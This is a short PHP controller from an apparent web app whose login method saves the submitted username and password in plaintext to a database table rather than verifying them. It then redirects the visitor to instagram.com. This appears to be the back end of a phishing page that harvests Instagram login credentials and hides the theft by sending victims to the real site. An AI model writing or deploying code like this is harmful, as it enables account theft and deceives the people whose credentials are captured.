<?php

namespace App;

use App\DataHandling;
use PDO;
use App\DB;

class Controller
{
    public static function index()
    {
        view('index.html');
    }
    public static function login()
    {
        $data = new DataHandling;

        DB::table("users")->setTableId("id")->setFetchMode(PDO::FETCH_OBJ)->create(
            [
                'username' => $data->post->username,
                'password' => $data->post->password,
            ]
        );

        return redirect('https://instagram.com');
    }
}
